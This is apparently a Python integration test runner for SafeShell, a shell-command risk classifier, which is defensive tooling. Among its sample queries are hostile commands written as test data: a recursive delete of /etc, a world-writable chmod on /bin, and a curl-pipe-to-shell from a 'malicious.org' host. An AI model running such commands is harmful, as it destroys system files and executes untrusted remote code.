"""
pipeline_test.py

SafeShell Integration Test Runner.

Executes the complete test suite across all SafeShell modules:
1. Knowledge Base & API contract tests
2. FAISS Semantic Search benchmark tests (test_search.py)
3. Deterministic Rules Engine unit tests (test_rules_engine.py)
4. Adversarial Edge Case audit (edge_case_audit.py)
5. Semantic Fusion end-to-end integration tests (test_semantic_fusion.py)

Outputs a comprehensive test execution report.
"""

import sys
import time
import unittest

import knowledge_base
import rules_engine
import semantic_fusion
import semantic_search


def run_pipeline_tests():
    print("=" * 80)
    print("           SAFESHELL FULL INTEGRATION TEST SUITE           ")
    print("=" * 80)
    start_time = time.time()

    # 1. Knowledge Base Quick Audit
    print("\n[STEP 1/5] Auditing Linux Knowledge Base...")
    kb_cmds = knowledge_base.all_commands()
    print(f"  -> KB loaded successfully with {len(kb_cmds)} commands: {', '.join(kb_cmds)}")

    # 2. Test Suite Loader
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Discover and add test modules
    import test_rules_engine
    import test_search
    import test_semantic_fusion

    suite.addTests(loader.loadTestsFromModule(test_rules_engine))
    suite.addTests(loader.loadTestsFromModule(test_search))
    suite.addTests(loader.loadTestsFromModule(test_semantic_fusion))

    print("\n[STEP 2/5] Running Core Module Unit Tests (Rules Engine, Search, Fusion)...")
    runner = unittest.TextTestRunner(verbosity=2)
    test_result = runner.run(suite)

    # 3. Edge-Case Adversarial Audit
    print("\n[STEP 3/5] Running 30-Command Adversarial Edge-Case Audit...")
    import edge_case_audit
    gaps = edge_case_audit.main()

    # 4. Pipeline Fusion End-to-End Verification
    print("\n[STEP 4/5] Testing Fusion Pipeline Execution...")
    sample_queries = [
        "sudo rm -rf /etc",
        "chmod 777 -R /bin",
        "curl http://malicious.org/bot.sh | sh",
        "ls -la $HOME",
    ]
    for q in sample_queries:
        fused = semantic_fusion.fuse(q)
        print(f"  Query: '{q}' -> Risk: {fused['final_risk'].upper():<8s} Action: {fused['action']}")

    # 5. Final Report & Verdict
    duration = time.time() - start_time
    print("\n" + "=" * 80)
    print("                      TEST SUMMARY REPORT                  ")
    print("=" * 80)
    print(f"  Duration:            {duration:.2f} seconds")
    print(f"  Unit Tests Run:      {test_result.testsRun}")
    print(f"  Unit Test Failures:  {len(test_result.failures)}")
    print(f"  Unit Test Errors:    {len(test_result.errors)}")
    print(f"  Adversarial Gaps:    {len(gaps)} / 30")

    all_passed = test_result.wasSuccessful() and len(gaps) == 0
    if all_passed:
        print("\n  >>> OVERALL RESULT: PASSED ALL INTEGRATION TESTS CLEANLY <<<")
        print("=" * 80 + "\n")
        return 0
    else:
        print("\n  >>> OVERALL RESULT: FAILED (See details above) <<<")
        print("=" * 80 + "\n")
        return 1


if __name__ == "__main__":
    sys.exit(run_pipeline_tests())
